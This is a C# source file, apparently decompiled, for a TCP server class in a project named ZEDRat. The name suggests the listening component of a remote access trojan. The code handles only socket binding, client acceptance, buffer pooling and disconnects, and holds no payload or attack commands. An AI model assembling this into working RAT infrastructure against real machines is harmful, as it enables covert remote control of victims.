using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.NetSerializer;
using ZEDRatApp.ZEDRAT.Packets;
using ZEDRatApp.ZEDRAT.Utilities;

namespace ZEDRatApp.ZEDRAT.Networking
{
	public class Server
	{
		public delegate void ServerStateEventHandler(Server s, bool listening, ushort port);

		public delegate void ClientStateEventHandler(Server s, Client c, bool connected);

		public delegate void ClientReadEventHandler(Server s, Client c, IPacket packet);

		public delegate void ClientWriteEventHandler(Server s, Client c, IPacket packet, long length, byte[] rawData);

		private Socket _handle;

		private SocketAsyncEventArgs _item;

		private List<Client> _clients;

		private readonly object _clientsLock = new object();

		public ushort Port { get; private set; }

		public long BytesReceived { get; set; }

		public long BytesSent { get; set; }

		public int BUFFER_SIZE => 16384;

		public uint KEEP_ALIVE_TIME => 25000u;

		public uint KEEP_ALIVE_INTERVAL => 25000u;

		public int HEADER_SIZE => 4;

		public int MAX_PACKET_SIZE => 5242880;

		public PooledBufferManager BufferManager { get; private set; }

		public bool Listening { get; private set; }

		protected Client[] Clients
		{
			get
			{
				lock (this._clientsLock)
				{
					return this._clients.ToArray();
				}
			}
		}

		public Serializer Serializer { get; protected set; }

		protected bool ProcessingDisconnect { get; set; }

		public event ServerStateEventHandler ServerState;

		public event ClientStateEventHandler ClientState;

		public event ClientReadEventHandler ClientRead;

		public event ClientWriteEventHandler ClientWrite;

		private void OnServerState(bool listening)
		{
			if (this.Listening != listening)
			{
				this.Listening = listening;
				this.ServerState?.Invoke(this, listening, this.Port);
			}
		}

		private void OnClientState(Client c, bool connected)
		{
			ClientStateEventHandler clientState = this.ClientState;
			if (!connected)
			{
				this.RemoveClient(c);
			}
			clientState?.Invoke(this, c, connected);
		}

		private void OnClientRead(Client c, IPacket packet)
		{
			this.ClientRead?.Invoke(this, c, packet);
		}

		private void OnClientWrite(Client c, IPacket packet, long length, byte[] rawData)
		{
			this.ClientWrite?.Invoke(this, c, packet, length, rawData);
		}

		protected Server()
		{
			this._clients = new List<Client>();
			this.BufferManager = new PooledBufferManager(this.BUFFER_SIZE, 1)
			{
				ClearOnReturn = false
			};
		}

		public void Listen(ushort port, bool ipv6)
		{
			this.Port = port;
			try
			{
				if (!this.Listening)
				{
					if (this._handle != null)
					{
						this._handle.Close();
						this._handle = null;
					}
					if (Socket.OSSupportsIPv6 && ipv6)
					{
						this._handle = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
						this._handle.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, 0);
						this._handle.Bind(new IPEndPoint(IPAddress.IPv6Any, port));
					}
					else
					{
						this._handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						this._handle.Bind(new IPEndPoint(IPAddress.Any, port));
					}
					this._handle.Listen(1000);
					this.ProcessingDisconnect = false;
					this.OnServerState(listening: true);
					if (this._item != null)
					{
						this._item.Dispose();
						this._item = null;
					}
					this._item = new SocketAsyncEventArgs();
					this._item.Completed += new EventHandler<SocketAsyncEventArgs>(AcceptClient);
					if (!this._handle.AcceptAsync(this._item))
					{
						this.AcceptClient(null, this._item);
					}
				}
			}
			catch (SocketException ex)
			{
				if (ex.ErrorCode == 10048)
				{
					MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					MessageBox.Show($"An unexpected socket error occurred: {ex.Message}", "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				this.Disconnect();
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		private void AcceptClient(object s, SocketAsyncEventArgs e)
		{
			try
			{
				do
				{
					switch (e.SocketError)
					{
					case SocketError.Success:
					{
						if (this.BufferManager.BuffersAvailable == 0)
						{
							this.BufferManager.IncreaseBufferCount(1);
						}
						Client client = new Client(this, e.AcceptSocket);
						this.AddClient(client);
						this.OnClientState(client, connected: true);
						break;
					}
					default:
						throw new Exception("SocketError");
					case SocketError.ConnectionReset:
						break;
					}
					e.AcceptSocket = null;
				}
				while (!this._handle.AcceptAsync(e));
			}
			catch (ObjectDisposedException)
			{
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		private void AddClient(Client client)
		{
			lock (this._clientsLock)
			{
				client.ClientState += new Client.ClientStateEventHandler(OnClientState);
				client.ClientRead += new Client.ClientReadEventHandler(OnClientRead);
				client.ClientWrite += new Client.ClientWriteEventHandler(OnClientWrite);
				this._clients.Add(client);
			}
		}

		private void RemoveClient(Client client)
		{
			if (this.ProcessingDisconnect)
			{
				return;
			}
			lock (this._clientsLock)
			{
				client.ClientState -= new Client.ClientStateEventHandler(OnClientState);
				client.ClientRead -= new Client.ClientReadEventHandler(OnClientRead);
				client.ClientWrite -= new Client.ClientWriteEventHandler(OnClientWrite);
				this._clients.Remove(client);
			}
		}

		public void Disconnect()
		{
			if (this.ProcessingDisconnect)
			{
				return;
			}
			this.ProcessingDisconnect = true;
			if (this._handle != null)
			{
				this._handle.Close();
				this._handle = null;
			}
			if (this._item != null)
			{
				this._item.Dispose();
				this._item = null;
			}
			lock (this._clientsLock)
			{
				while (this._clients.Count != 0)
				{
					try
					{
						this._clients[0].Disconnect();
						this._clients[0].ClientState -= new Client.ClientStateEventHandler(OnClientState);
						this._clients[0].ClientRead -= new Client.ClientReadEventHandler(OnClientRead);
						this._clients[0].ClientWrite -= new Client.ClientWriteEventHandler(OnClientWrite);
						this._clients.RemoveAt(0);
					}
					catch
					{
					}
				}
			}
			this.ProcessingDisconnect = false;
			this.OnServerState(listening: false);
		}
	}
}
